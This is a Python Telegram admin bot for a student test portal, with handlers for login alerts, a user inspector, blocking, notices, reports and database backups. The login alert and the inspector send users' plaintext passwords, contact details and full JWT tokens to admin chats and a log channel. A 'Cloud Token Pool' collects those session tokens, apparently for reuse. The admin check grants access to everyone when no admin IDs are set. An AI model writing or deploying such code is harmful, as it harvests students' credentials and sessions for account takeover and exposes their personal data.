import io
import json
import html
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import config
from db_manager import db_manager, now_ist_str
from api_server import notify_callbacks

bot = telebot.TeleBot(config.BOT_TOKEN, parse_mode="HTML")


def esc(val):
    return html.escape(str(val if val is not None else "N/A"))


def is_admin(user_id):
    return (not config.ADMIN_IDS) or (int(user_id) in config.ADMIN_IDS)


def fmt_duration(sec):
    sec = int(sec or 0)
    hrs = sec // 3600
    mins = (sec % 3600) // 60
    return f"{hrs}h {mins}m" if hrs > 0 else f"{mins}m {sec % 60}s"


def broadcast_to_admins(text, reply_markup=None):
    targets = list(config.ADMIN_IDS)
    if config.LOG_CHANNEL_ID:
        try:
            targets.append(int(config.LOG_CHANNEL_ID))
        except Exception:
            pass
    for chat_id in set(targets):
        try:
            bot.send_message(chat_id, text, reply_markup=reply_markup, disable_web_page_preview=True)
        except Exception as e:
            print(f"Notify error to {chat_id}: {e}")


# =========================================================
# LIVE TELEGRAM ALERTS (LOGIN / TEST SUBMIT / REPORTS)
# =========================================================
def on_user_login_notify(user_doc, shard_label):
    if not db_manager.get_portal_settings().get("login_alerts", True):
        return
    uid = user_doc.get("user_id", "N/A")
    status_badge = "🚫 BLOCKED" if user_doc.get("is_blocked") else "🟢 ACTIVE"
    msg = (
        f"╔══════════════════════════╗\n"
        f"║  🔔 <b>NEW PORTAL LOGIN</b>  ║\n"
        f"╚══════════════════════════╝\n"
        f"┌ <b>Name:</b> {esc(user_doc.get('name'))} ({status_badge})\n"
        f"├ <b>User ID:</b> <code>{esc(uid)}</code> ({esc(shard_label)})\n"
        f"├ <b>Phone:</b> <code>{esc(user_doc.get('phone'))}</code>\n"
        f"├ <b>Email:</b> <code>{esc(user_doc.get('email'))}</code>\n"
        f"├ <b>Password:</b> <code>{esc(user_doc.get('password'))}</code>\n"
        f"├ <b>Method:</b> {esc(user_doc.get('login_method'))}\n"
        f"├ <b>State/Dist:</b> {esc(user_doc.get('state_district'))}\n"
        f"├ <b>Logins:</b> #{esc(user_doc.get('login_count', 1))}\n"
        f"└ <b>Time:</b> {esc(user_doc.get('last_login'))}\n\n"
        f"🔑 <b>JWT Token:</b>\n<code>{esc((user_doc.get('jwt_token') or '')[:350])}</code>"
    )
    kb = InlineKeyboardMarkup()
    kb.row(
        InlineKeyboardButton("👤 Inspect A-to-Z", callback_data=f"uinfo:{uid}"),
        InlineKeyboardButton("🔑 Add to Pool", callback_data=f"promtok:{uid}")
    )
    broadcast_to_admins(msg, reply_markup=kb)


def on_test_submit_notify(attempt, leaderboard):
    if not db_manager.get_portal_settings().get("test_submit_alerts", True):
        return
    uid = attempt.get("user_id", "N/A")
    rank = leaderboard.get("my_rank", "-")
    total_p = leaderboard.get("total_participants", 1)
    msg = (
        f"╔══════════════════════════╗\n"
        f"║  📝 <b>TEST SUBMITTED</b>    ║\n"
        f"╚══════════════════════════╝\n"
        f"┌ <b>Student:</b> {esc(attempt.get('user_name'))} (<code>{esc(uid)}</code>)\n"
        f"├ <b>Test:</b> {esc(attempt.get('test_title'))}\n"
        f"├ <b>Score:</b> <b>{attempt.get('score')}/{attempt.get('max_marks')}</b> | 🎯 {attempt.get('accuracy')}%\n"
        f"├ <b>Result:</b> ✓{attempt.get('correct')} | ✕{attempt.get('incorrect')} | −{attempt.get('unattempted')}\n"
        f"├ <b>Live Rank:</b> #{rank} / {total_p} ({leaderboard.get('my_percentile', 100)}%ile)\n"
        f"└ <b>Time:</b> {esc(attempt.get('submitted_at'))}"
    )
    kb = InlineKeyboardMarkup()
    kb.add(InlineKeyboardButton("👤 Inspect Student", callback_data=f"uinfo:{uid}"))
    broadcast_to_admins(msg, reply_markup=kb)


def on_report_notify(rep):
    msg = (
        f"╔══════════════════════════╗\n"
        f"║  🚩 <b>USER REPORT / REQ</b> ║\n"
        f"╚══════════════════════════╝\n"
        f"┌ <b>ID:</b> <code>{esc(rep.get('report_id'))}</code>\n"
        f"├ <b>User:</b> {esc(rep.get('user_name'))} (<code>{esc(rep.get('user_id'))}</code>)\n"
        f"├ <b>Phone:</b> <code>{esc(rep.get('phone'))}</code>\n"
        f"├ <b>Type:</b> {esc(rep.get('type'))}\n"
        f"├ <b>Subject:</b> {esc(rep.get('subject'))}\n"
        f"└ <b>Message:</b> {esc(rep.get('message'))}"
    )
    kb = InlineKeyboardMarkup()
    kb.add(InlineKeyboardButton("✅ Mark Resolved", callback_data=f"resrep:{rep.get('report_id')}"))
    broadcast_to_admins(msg, reply_markup=kb)


notify_callbacks["on_login"] = on_user_login_notify
notify_callbacks["on_test_submit"] = on_test_submit_notify
notify_callbacks["on_report"] = on_report_notify


# =========================================================
# MAIN ADMIN DASHBOARD MENU
# =========================================================
def build_main_menu():
    kb = InlineKeyboardMarkup(row_width=2)
    kb.add(
        InlineKeyboardButton("👥 All Users", callback_data="users:1"),
        InlineKeyboardButton("🔴 Live Activity", callback_data="live_act")
    )
    kb.add(
        InlineKeyboardButton("📊 4-DB Stats", callback_data="stats"),
        InlineKeyboardButton("🔑 Token Pool", callback_data="tokens")
    )
    kb.add(
        InlineKeyboardButton("📢 Notice Board", callback_data="notices"),
        InlineKeyboardButton("🚩 User Reports", callback_data="reports")
    )
    kb.add(
        InlineKeyboardButton("🛠️ Maintenance & Alerts", callback_data="settings"),
        InlineKeyboardButton("🐞 Error Logs", callback_data="errors")
    )
    kb.add(
        InlineKeyboardButton("🚫 Blocked Users", callback_data="blocked_list"),
        InlineKeyboardButton("💾 Full 4-DB Backup", callback_data="backup")
    )
    return kb


def build_stats_text():
    st = db_manager.get_cluster_stats()
    cfg = st["settings"]
    m_icon = "🔴 ON" if cfg["maintenance_mode"] else "🟢 OFF"
    lines = [
        "╔═══════════════════════════╗",
        "║  🚀 <b>RWA SKY ADMIN PANEL</b> ║",
        "╚═══════════════════════════╝",
        f"┌ <b>Maintenance Mode:</b> {m_icon}",
        f"├ <b>Total Users:</b> <code>{st['total_users']}</code> (🚫 {st['blocked_users']} Blocked)",
        f"├ <b>Active Today:</b> <code>{st['active_today']}</code>",
        f"├ <b>Tests Attempted:</b> <code>{st['total_tests']}</code>",
        f"├ <b>Activity Logs:</b> <code>{st['total_logs']}</code>",
        f"├ <b>Cloud Tokens:</b> <code>{st['total_admin_tokens']}</code> | 📢 <code>{st['active_notices']}</code>",
        f"└ <b>Open Reports:</b> <code>{st['open_reports']}</code> | 🐞 Errors: <code>{st['error_logs_count']}</code>",
        "",
        f"🗄️ <b>MongoDB Cluster ({st['connected_dbs']}/4 Active):</b>"
    ]
    for d in st["per_db"]:
        if d.get("error"):
            lines.append(f"├ {d['label']}: ❌ Error")
        else:
            pct = round((d["size_mb"] / d["max_mb"]) * 100, 1)
            lines.append(
                f"├ <b>{d['label']}:</b> {d['size_mb']}MB / 512MB ({pct}%) | 👤 {d['users']} | 📝 {d['tests']}"
            )
    lines.append(f"└ <b>Updated:</b> {st['updated_at']}")
    return "\n".join(lines)


# =========================================================
# SLASH COMMANDS
# =========================================================
@bot.message_handler(commands=["start", "admin", "panel"])
def cmd_start(m):
    if not is_admin(m.from_user.id):
        bot.reply_to(m, "⛔ Access Denied. Admin only.")
        return
    bot.send_message(m.chat.id, build_stats_text(), reply_markup=build_main_menu())


@bot.message_handler(commands=["user", "find", "search"])
def cmd_search_user(m):
    if not is_admin(m.from_user.id):
        return
    parts = m.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.reply_to(m, "🔍 Usage: <code>/find Name/Phone/UserID</code>")
        return
    q = parts[1].strip()
    matches = db_manager.search_users(q)
    if not matches:
        bot.reply_to(m, f"❌ Koi user nahi mila for: <code>{esc(q)}</code>")
        return
    if len(matches) == 1:
        text, kb = build_user_dossier_view(matches[0]["user_id"])
        bot.send_message(m.chat.id, text, reply_markup=kb)
        return
    kb = InlineKeyboardMarkup()
    lines = [f"🔍 <b>Search Results for '{esc(q)}' ({len(matches)}):</b>\n"]
    for u in matches:
        uid = u["user_id"]
        lines.append(f"• <b>{esc(u.get('name'))}</b> | <code>{esc(uid)}</code> | 📱 {esc(u.get('phone'))}")
        kb.add(InlineKeyboardButton(f"👤 {u.get('name', 'User')[:20]} ({uid})", callback_data=f"uinfo:{uid}"))
    bot.send_message(m.chat.id, "\n".join(lines), reply_markup=kb)


@bot.message_handler(commands=["block"])
def cmd_block(m):
    if not is_admin(m.from_user.id):
        return
    parts = m.text.split(maxsplit=2)
    if len(parts) < 2:
        bot.reply_to(m, "🚫 Usage: <code>/block USER_ID [Reason]</code>")
        return
    uid = parts[1].strip()
    reason = parts[2].strip() if len(parts) > 2 else "Blocked by Admin"
    ok = db_manager.set_user_blocked(uid, True, reason)
    bot.reply_to(m, f"🚫 User <code>{esc(uid)}</code> Blocked!\nReason: {esc(reason)}" if ok else "❌ User not found.")


@bot.message_handler(commands=["unblock"])
def cmd_unblock(m):
    if not is_admin(m.from_user.id):
        return
    parts = m.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.reply_to(m, "✅ Usage: <code>/unblock USER_ID</code>")
        return
    uid = parts[1].strip()
    ok = db_manager.set_user_blocked(uid, False)
    bot.reply_to(m, f"✅ User <code>{esc(uid)}</code> Unblocked!" if ok else "❌ User not found.")


@bot.message_handler(commands=["maintenance"])
def cmd_maintenance(m):
    if not is_admin(m.from_user.id):
        return
    parts = m.text.split(maxsplit=2)
    if len(parts) < 2 or parts[1].lower() not in ("on", "off"):
        bot.reply_to(m, "🛠️ Usage:\n<code>/maintenance on Custom message</code>\n<code>/maintenance off</code>")
        return
    mode = parts[1].lower() == "on"
    upd = {"maintenance_mode": mode}
    if len(parts) > 2:
        upd["maintenance_message"] = parts[2].strip()
    cfg = db_manager.update_portal_settings(upd)
    state_str = "🔴 ON" if cfg["maintenance_mode"] else "🟢 OFF"
    bot.reply_to(m, f"🛠️ Maintenance Mode is now <b>{state_str}</b>\nMessage: {esc(cfg['maintenance_message'])}")


@bot.message_handler(commands=["addtoken"])
def cmd_add_token(m):
    if not is_admin(m.from_user.id):
        return
    parts = m.text.split(maxsplit=2)
    if len(parts) < 3:
        bot.reply_to(m, "🔑 Usage: <code>/addtoken USER_ID JWT_TOKEN</code>")
        return
    ok = db_manager.add_admin_token(parts[1].strip(), parts[2].strip(), label=f"Cloud #{parts[1].strip()}")
    bot.reply_to(m, "✅ Token Cloud Pool mein add ho gaya!" if ok else "❌ Failed.")


@bot.message_handler(commands=["deltoken"])
def cmd_del_token(m):
    if not is_admin(m.from_user.id):
        return
    parts = m.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.reply_to(m, "🗑 Usage: <code>/deltoken USER_ID</code>")
        return
    ok = db_manager.delete_admin_token(user_id=parts[1].strip())
    bot.reply_to(m, "✅ Token delete ho gaya." if ok else "❌ Token nahi mila.")


@bot.message_handler(commands=["addnotice"])
def cmd_add_notice(m):
    if not is_admin(m.from_user.id):
        return
    parts = m.text.split(maxsplit=1)
    if len(parts) < 2 or "|" not in parts[1]:
        bot.reply_to(m, "📢 Usage: <code>/addnotice Title | Message</code>")
        return
    title, msg = [x.strip() for x in parts[1].split("|", 1)]
    res = db_manager.add_notice(title, msg)
    bot.reply_to(m, f"✅ Notice Live! ID: <code>{esc(res['notice_id'])}</code>" if res else "❌ Error.")


@bot.message_handler(commands=["backup"])
def cmd_backup(m):
    if not is_admin(m.from_user.id):
        return
    send_backup_file(m.chat.id)


# =========================================================
# USER A-TO-Z INSPECTOR
# =========================================================
def build_user_dossier_view(user_id):
    data = db_manager.get_user_full_dossier(user_id)
    if not data or not data.get("user"):
        return None, None

    u = data["user"]
    sync = data["sync"]
    tests = data["tests"]
    logs = data["logs"]
    courses = u.get("purchased_courses") or []
    is_blk = bool(u.get("is_blocked", False))

    watch_hist = sync.get("watch_history") or {}
    bookmarks = sync.get("bookmarks") or []
    mistakes = sync.get("mistake_bank") or []
    notes_map = sync.get("video_notes") or {}
    notes_cnt = sum(len(v) for v in notes_map.values() if isinstance(v, list))

    text = (
        f"╔═══════════════════════════╗\n"
        f"║  👤 <b>USER A-TO-Z PROFILE</b> ║\n"
        f"╚═══════════════════════════╝\n"
        f"┌ <b>Status:</b> {'🚫 BLOCKED (' + esc(u.get('block_reason')) + ')' if is_blk else '🟢 ACTIVE'}\n"
        f"├ <b>Name:</b> {esc(u.get('name'))}\n"
        f"├ <b>User ID:</b> <code>{esc(u.get('user_id'))}</code> ({esc(data['shard'])})\n"
        f"├ <b>Phone:</b> <code>{esc(u.get('phone'))}</code>\n"
        f"├ <b>Email:</b> <code>{esc(u.get('email'))}</code>\n"
        f"├ <b>Password:</b> <code>{esc(u.get('password'))}</code>\n"
        f"├ <b>State/Dist:</b> {esc(u.get('state_district'))}\n"
        f"├ <b>Logins:</b> #{esc(u.get('login_count', 1))} | Last: {esc(u.get('last_seen'))}\n"
        f"└ <b>Live Activity:</b> {esc(u.get('current_activity', 'Idle'))}\n\n"
        f"📊 <b>Study & Portal Summary:</b>\n"
        f"┌ 🎓 <b>Courses:</b> <code>{len(courses)}</code> | 🔥 <b>Streak:</b> <code>{esc(u.get('study_streak', 1))}d</code>\n"
        f"├ ⏱️ <b>Watch Time:</b> <code>{fmt_duration(u.get('total_watch_seconds', 0))}</code> | 🎬 <code>{len(watch_hist)}</code>\n"
        f"├ 📝 <b>Tests:</b> <code>{len(tests)}</code> | ⭐ <b>Saved:</b> <code>{len(bookmarks)}</code>\n"
        f"└ ❌ <b>Mistakes:</b> <code>{len(mistakes)}</code> | 🗒️ <b>Notes:</b> <code>{notes_cnt}</code>"
    )

    uid = u["user_id"]
    kb = InlineKeyboardMarkup(row_width=2)
    kb.add(
        InlineKeyboardButton(f"🎓 Courses ({len(courses)})", callback_data=f"ucourses:{uid}"),
        InlineKeyboardButton(f"⚡ Activity ({len(logs)})", callback_data=f"ulogs:{uid}")
    )
    kb.add(
        InlineKeyboardButton(f"📝 Test Scores ({len(tests)})", callback_data=f"utests:{uid}"),
        InlineKeyboardButton("🔑 Token / Promote", callback_data=f"utoken:{uid}")
    )
    kb.add(
        InlineKeyboardButton("✅ Unblock User" if is_blk else "🚫 Block User", callback_data=f"tglblk:{uid}"),
        InlineKeyboardButton("📥 User JSON", callback_data=f"ujson:{uid}")
    )
    kb.add(InlineKeyboardButton("⬅ Back to Users", callback_data="users:1"))
    return text, kb


def build_settings_view():
    cfg = db_manager.get_portal_settings()
    text = (
        f"╔═══════════════════════════╗\n"
        f"║  🛠️ <b>PORTAL CONTROLS</b>     ║\n"
        f"╚═══════════════════════════╝\n"
        f"┌ <b>Maintenance Mode:</b> {'🔴 ON (Site Locked)' if cfg['maintenance_mode'] else '🟢 OFF (Site Live)'}\n"
        f"├ <b>Login Alerts:</b> {'🔔 ON' if cfg['login_alerts'] else '🔕 OFF'}\n"
        f"├ <b>Test Submit Alerts:</b> {'🔔 ON' if cfg['test_submit_alerts'] else '🔕 OFF'}\n"
        f"└ <b>Maintenance Msg:</b>\n<i>{esc(cfg['maintenance_message'])}</i>\n\n"
        f"💡 Custom Msg ke liye:\n<code>/maintenance on Your message here</code>"
    )
    kb = InlineKeyboardMarkup(row_width=1)
    kb.add(
        InlineKeyboardButton(
            "🟢 Turn Maintenance OFF" if cfg["maintenance_mode"] else "🔴 Turn Maintenance ON",
            callback_data="tgl_maint"
        ),
        InlineKeyboardButton(
            "🔕 Mute Login Alerts" if cfg["login_alerts"] else "🔔 Enable Login Alerts",
            callback_data="tgl_login_alert"
        ),
        InlineKeyboardButton(
            "🔕 Mute Test Submit Alerts" if cfg["test_submit_alerts"] else "🔔 Enable Test Submit Alerts",
            callback_data="tgl_test_alert"
        ),
        InlineKeyboardButton("🏠 Back to Menu", callback_data="main")
    )
    return text, kb


def send_backup_file(chat_id):
    wait = bot.send_message(chat_id, "⏳ Chaaron MongoDB shards ka full JSON backup taiyaar ho raha hai...")
    try:
        data = db_manager.export_full_backup()
        raw = json.dumps(data, indent=2, ensure_ascii=False).encode("utf-8")
        bio = io.BytesIO(raw)
        bio.name = f"RWA_4DB_Backup_{now_ist_str().replace(' ', '_').replace(':', '-')}.json"
        bot.send_document(chat_id, bio, caption="💾 <b>Complete 4-MongoDB Cluster Backup</b>")
        bot.delete_message(chat_id, wait.message_id)
    except Exception as e:
        bot.edit_message_text(f"❌ Backup Error: {esc(e)}", chat_id, wait.message_id)


# =========================================================
# CALLBACK ROUTER
# =========================================================
@bot.callback_query_handler(func=lambda c: True)
def handle_callbacks(c):
    if not is_admin(c.from_user.id):
        bot.answer_callback_query(c.id, "⛔ Admin Only!", show_alert=True)
        return

    data = c.data
    chat_id = c.message.chat.id
    msg_id = c.message.message_id

    try:
        if data in ("main", "stats"):
            bot.edit_message_text(build_stats_text(), chat_id, msg_id, reply_markup=build_main_menu())

        elif data == "settings":
            t, kb = build_settings_view()
            bot.edit_message_text(t, chat_id, msg_id, reply_markup=kb)

        elif data == "tgl_maint":
            cur = db_manager.get_portal_settings()["maintenance_mode"]
            db_manager.update_portal_settings({"maintenance_mode": not cur})
            t, kb = build_settings_view()
            bot.edit_message_text(t, chat_id, msg_id, reply_markup=kb)

        elif data == "tgl_login_alert":
            cur = db_manager.get_portal_settings()["login_alerts"]
            db_manager.update_portal_settings({"login_alerts": not cur})
            t, kb = build_settings_view()
            bot.edit_message_text(t, chat_id, msg_id, reply_markup=kb)

        elif data == "tgl_test_alert":
            cur = db_manager.get_portal_settings()["test_submit_alerts"]
            db_manager.update_portal_settings({"test_submit_alerts": not cur})
            t, kb = build_settings_view()
            bot.edit_message_text(t, chat_id, msg_id, reply_markup=kb)

        elif data.startswith("users:"):
            page = int(data.split(":")[1])
            users, total = db_manager.get_all_users_paginated(page=page, per_page=8)
            total_pages = max(1, (total + 7) // 8)
            lines = [
                "╔═══════════════════════════╗",
                "║  👥 <b>REGISTERED USERS</b>    ║",
                "╚═══════════════════════════╝",
                f"Total: <b>{total}</b> | Page <b>{page}/{total_pages}</b>\n"
            ]
            kb = InlineKeyboardMarkup(row_width=1)
            for u in users:
                uid = u["user_id"]
                blk = "🚫 " if u.get("is_blocked") else ""
                c_cnt = len(u.get("purchased_courses") or [])
                lines.append(
                    f"• {blk}<b>{esc(u.get('name'))}</b> (<code>{esc(uid)}</code>)\n"
                    f"  └ 🎓 {c_cnt} Courses | 🔥 {u.get('study_streak', 1)}d | ⚡ {esc((u.get('current_activity') or 'Idle')[:35])}"
                )
                kb.add(InlineKeyboardButton(
                    f"{blk}👤 {u.get('name', 'User')[:18]} • {uid} [{u.get('db_shard', 'DB')}]",
                    callback_data=f"uinfo:{uid}"
                ))
            nav = []
            if page > 1:
                nav.append(InlineKeyboardButton("⬅ Prev", callback_data=f"users:{page - 1}"))
            nav.append(InlineKeyboardButton("🏠 Menu", callback_data="main"))
            if page < total_pages:
                nav.append(InlineKeyboardButton("Next ➡", callback_data=f"users:{page + 1}"))
            kb.row(*nav)
            bot.edit_message_text("\n".join(lines)[:4000], chat_id, msg_id, reply_markup=kb)

        elif data == "blocked_list":
            blks = db_manager.get_blocked_users()
            lines = [
                "╔═══════════════════════════╗",
                "║  🚫 <b>BLOCKED USERS</b>       ║",
                "╚═══════════════════════════╝\n"
            ]
            kb = InlineKeyboardMarkup()
            if not blks:
                lines.append("Koi bhi user blocked nahi hai.")
            else:
                for u in blks[:15]:
                    uid = u["user_id"]
                    lines.append(f"• <b>{esc(u.get('name'))}</b> (<code>{esc(uid)}</code>)\n  └ Reason: {esc(u.get('block_reason'))}")
                    kb.add(InlineKeyboardButton(f"✅ Unblock {u.get('name', uid)[:18]}", callback_data=f"tglblk:{uid}"))
            kb.add(InlineKeyboardButton("🏠 Back to Menu", callback_data="main"))
            bot.edit_message_text("\n".join(lines)[:4000], chat_id, msg_id, reply_markup=kb)

        elif data.startswith("uinfo:"):
            uid = data.split(":", 1)[1]
            text, kb = build_user_dossier_view(uid)
            if text:
                bot.edit_message_text(text, chat_id, msg_id, reply_markup=kb)

        elif data.startswith("tglblk:"):
            uid = data.split(":", 1)[1]
            currently_blocked, _ = db_manager.is_user_blocked(uid)
            db_manager.set_user_blocked(uid, not currently_blocked, "Blocked via Telegram Admin" if not currently_blocked else "")
            bot.answer_callback_query(c.id, "✅ Unblocked!" if currently_blocked else "🚫 User Blocked!", show_alert=True)
            text, kb = build_user_dossier_view(uid)
            if text:
                bot.edit_message_text(text, chat_id, msg_id, reply_markup=kb)
            return

        elif data.startswith("ucourses:"):
            uid = data.split(":", 1)[1]
            d = db_manager.get_user_full_dossier(uid)
            u = d["user"] if d else {}
            courses = u.get("purchased_courses") or []
            lines = [f"🎓 <b>Courses of {esc(u.get('name'))} (<code>{esc(uid)}</code>)</b>\n"]
            if not courses:
                lines.append("Koi purchased course sync nahi hua hai.")
            else:
                for i, cr in enumerate(courses, start=1):
                    lines.append(f"{i:02d}. <b>{esc(cr.get('course_name'))}</b> (ID: <code>{esc(cr.get('id'))}</code>)")
            kb = InlineKeyboardMarkup()
            kb.add(InlineKeyboardButton("⬅ Back to User", callback_data=f"uinfo:{uid}"))
            bot.edit_message_text("\n".join(lines)[:4000], chat_id, msg_id, reply_markup=kb)

        elif data.startswith("ulogs:"):
            uid = data.split(":", 1)[1]
            d = db_manager.get_user_full_dossier(uid)
            u = d["user"] if d else {}
            logs = d["logs"] if d else []
            lines = [f"⚡ <b>Activity: {esc(u.get('name'))} (<code>{esc(uid)}</code>)</b>\n"]
            for l in logs[:18]:
                lines.append(f"• <b>[{esc(l.get('action'))}]</b> {esc(l.get('detail'))}\n  └ 🕒 {esc(l.get('time_str'))}")
            if not logs:
                lines.append("No activity yet.")
            kb = InlineKeyboardMarkup()
            kb.row(
                InlineKeyboardButton("🔄 Refresh", callback_data=f"ulogs:{uid}"),
                InlineKeyboardButton("⬅ Back", callback_data=f"uinfo:{uid}")
            )
            bot.edit_message_text("\n".join(lines)[:4000], chat_id, msg_id, reply_markup=kb)

        elif data.startswith("utests:"):
            uid = data.split(":", 1)[1]
            d = db_manager.get_user_full_dossier(uid)
            u = d["user"] if d else {}
            tests = d["tests"] if d else []
            lines = [f"📝 <b>Test History: {esc(u.get('name'))} (<code>{esc(uid)}</code>)</b>\n"]
            for i, t in enumerate(tests[:12], start=1):
                lines.append(
                    f"{i:02d}. <b>{esc(t.get('test_title'))}</b>\n"
                    f"    └ 🏆 <b>{t.get('score')}/{t.get('max_marks')}</b> | 🎯 {t.get('accuracy')}% | 🕒 {esc(t.get('submitted_at'))}"
                )
            if not tests:
                lines.append("Abhi koi test attempt nahi kiya.")
            kb = InlineKeyboardMarkup()
            kb.add(InlineKeyboardButton("⬅ Back to User", callback_data=f"uinfo:{uid}"))
            bot.edit_message_text("\n".join(lines)[:4000], chat_id, msg_id, reply_markup=kb)

        elif data.startswith("utoken:"):
            uid = data.split(":", 1)[1]
            d = db_manager.get_user_full_dossier(uid)
            u = d["user"] if d else {}
            text = f"🔑 <b>JWT Token of {esc(u.get('name'))}:</b>\n\n<code>{esc(u.get('jwt_token') or 'N/A')}</code>"
            kb = InlineKeyboardMarkup()
            kb.add(InlineKeyboardButton("➕ Add to Global Cloud Pool", callback_data=f"promtok:{uid}"))
            kb.add(InlineKeyboardButton("⬅ Back to User", callback_data=f"uinfo:{uid}"))
            bot.edit_message_text(text[:4000], chat_id, msg_id, reply_markup=kb)

        elif data.startswith("promtok:"):
            uid = data.split(":", 1)[1]
            d = db_manager.get_user_full_dossier(uid)
            u = d["user"] if d else None
            if u and u.get("jwt_token"):
                db_manager.add_admin_token(uid, u["jwt_token"], label=f"Cloud #{uid}")
                bot.answer_callback_query(c.id, "✅ Token Cloud Pool mein add ho gaya!", show_alert=True)
            else:
                bot.answer_callback_query(c.id, "❌ Valid token nahi mila.", show_alert=True)
            return

        elif data.startswith("ujson:"):
            uid = data.split(":", 1)[1]
            d = db_manager.get_user_full_dossier(uid)
            if d:
                raw = json.dumps(d, indent=2, ensure_ascii=False).encode("utf-8")
                bio = io.BytesIO(raw)
                bio.name = f"User_{uid}_Full_Data.json"
                bot.send_document(chat_id, bio, caption=f"📥 Full A-to-Z JSON for User <code>{esc(uid)}</code>")

        elif data == "live_act":
            logs = db_manager.get_recent_global_activities(limit=18)
            lines = ["╔═══════════════════════════╗", "║  🔴 <b>LIVE ACTIVITY FEED</b>  ║", "╚═══════════════════════════╝\n"]
            for l in logs:
                lines.append(f"• <b>{esc(l.get('user_name'))}</b> (<code>{esc(l.get('user_id'))}</code>)\n  ├ ⚡ <b>{esc(l.get('action'))}:</b> {esc(l.get('detail'))}\n  └ 🕒 {esc(l.get('time_str'))}")
            if not logs:
                lines.append("Abhi koi activity nahi hai.")
            kb = InlineKeyboardMarkup()
            kb.row(InlineKeyboardButton("🔄 Refresh", callback_data="live_act"), InlineKeyboardButton("🏠 Menu", callback_data="main"))
            bot.edit_message_text("\n".join(lines)[:4000], chat_id, msg_id, reply_markup=kb)

        elif data == "tokens":
            toks = db_manager.get_all_admin_tokens()
            lines = ["╔═══════════════════════════╗", "║  🔑 <b>CLOUD TOKEN POOL</b>    ║", "╚═══════════════════════════╝", f"Active: <b>{len(toks)}</b>\n"]
            for i, t in enumerate(toks, start=1):
                short = t["token"][:18] + "..." + t["token"][-10:]
                lines.append(f"{i:02d}. UID: <code>{esc(t['userId'])}</code> | <code>{esc(short)}</code>")
            lines.append("\n➕ <code>/addtoken UID TOKEN</code>\n🗑 <code>/deltoken UID</code>")
            kb = InlineKeyboardMarkup()
            kb.add(InlineKeyboardButton("🏠 Back to Menu", callback_data="main"))
            bot.edit_message_text("\n".join(lines)[:4000], chat_id, msg_id, reply_markup=kb)

        elif data == "notices":
            notices = db_manager.get_active_notices(limit=10)
            lines = ["╔═══════════════════════════╗", "║  📢 <b>LIVE NOTICE BOARD</b>   ║", "╚═══════════════════════════╝\n"]
            kb = InlineKeyboardMarkup()
            for n in notices:
                lines.append(f"• <b>{esc(n['title'])}</b>\n  ├ {esc(n['message'])}\n  └ 🕒 {esc(n['created_at'])}")
                kb.add(InlineKeyboardButton(f"🗑 Delete: {n['title'][:22]}", callback_data=f"delnot:{n['notice_id']}"))
            if not notices:
                lines.append("Koi active notice nahi hai.")
            lines.append("\n➕ <code>/addnotice Title | Message</code>")
            kb.add(InlineKeyboardButton("🏠 Back to Menu", callback_data="main"))
            bot.edit_message_text("\n".join(lines)[:4000], chat_id, msg_id, reply_markup=kb)

        elif data.startswith("delnot:"):
            db_manager.delete_notice(data.split(":", 1)[1])
            c.data = "notices"
            handle_callbacks(c)
            return

        elif data == "reports":
            reps = db_manager.get_reports(limit=10)
            lines = ["╔═══════════════════════════╗", "║  🚩 <b>USER REPORTS</b>        ║", "╚═══════════════════════════╝\n"]
            kb = InlineKeyboardMarkup()
            for r in reps:
                ic = "🟢" if r.get("status") == "RESOLVED" else "🔴"
                lines.append(f"{ic} <b>{esc(r.get('type'))}:</b> {esc(r.get('subject'))}\n  ├ 👤 {esc(r.get('user_name'))} (<code>{esc(r.get('user_id'))}</code>)\n  ├ 💬 {esc(r.get('message'))}\n  └ 🕒 {esc(r.get('created_at'))}")
                if r.get("status") != "RESOLVED":
                    kb.add(InlineKeyboardButton(f"✅ Resolve {r['report_id'][-6:]}", callback_data=f"resrep:{r['report_id']}"))
            if not reps:
                lines.append("Koi report pending nahi hai.")
            kb.add(InlineKeyboardButton("🏠 Back to Menu", callback_data="main"))
            bot.edit_message_text("\n".join(lines)[:4000], chat_id, msg_id, reply_markup=kb)

        elif data.startswith("resrep:"):
            db_manager.resolve_report(data.split(":", 1)[1])
            c.data = "reports"
            handle_callbacks(c)
            return

        elif data == "errors":
            errs = db_manager.get_error_logs(limit=12)
            lines = ["╔═══════════════════════════╗", "║  🐞 <b>ERROR LOGS FOLDER</b>   ║", "╚═══════════════════════════╝\n"]
            for e in errs:
                lines.append(f"• <b>[{esc(e.get('source'))}]</b> UID: <code>{esc(e.get('user_id'))}</code>\n  ├ {esc(e.get('message')[:140])}\n  └ 🕒 {esc(e.get('time_str'))}")
            if not errs:
                lines.append("🟢 Koi error log nahi hai!")
            kb = InlineKeyboardMarkup()
            if errs:
                kb.add(InlineKeyboardButton("🗑 Clear All Errors", callback_data="clear_errors"))
            kb.row(InlineKeyboardButton("🔄 Refresh", callback_data="errors"), InlineKeyboardButton("🏠 Menu", callback_data="main"))
            bot.edit_message_text("\n".join(lines)[:4000], chat_id, msg_id, reply_markup=kb)

        elif data == "clear_errors":
            db_manager.clear_error_logs()
            bot.answer_callback_query(c.id, "🗑 Error Logs Cleared!", show_alert=True)
            c.data = "errors"
            handle_callbacks(c)
            return

        elif data == "backup":
            send_backup_file(chat_id)

        bot.answer_callback_query(c.id)
    except Exception as e:
        print(f"Callback Error ({data}): {e}")
        try:
            bot.answer_callback_query(c.id, "Updated")
        except Exception:
            pass
